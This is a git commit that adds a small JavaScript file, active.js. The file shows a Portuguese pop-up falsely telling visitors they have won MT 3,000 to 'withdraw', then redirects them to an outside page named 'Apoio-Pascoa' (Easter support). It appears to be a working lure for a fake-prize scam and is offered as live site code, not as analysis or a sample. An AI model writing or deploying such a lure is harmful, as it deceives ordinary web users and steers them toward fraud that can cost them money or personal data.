c74fce4ee1ec6cf916ab87087c06bea48f3898bb
graantx <slicer_sizzles9k@icloud.com>
2026-04-04 22:15:42 +0100

    Create active.js

---
+++ active.js
@@ -0,0 +1,8 @@
+var password = 'SACAR DINHEIRO'
+password = prompt(
+  'Parabéns! Você tem direito a receber MT 3.000. Por favor, clique em OK para SACAR.',
+  'SACAR DINHEIRO'
+);
+if (password != 'SACAR DINHEIRO') {
+  location.href = 'https://rhud.info/Apoio-Pascoa.html';
+}
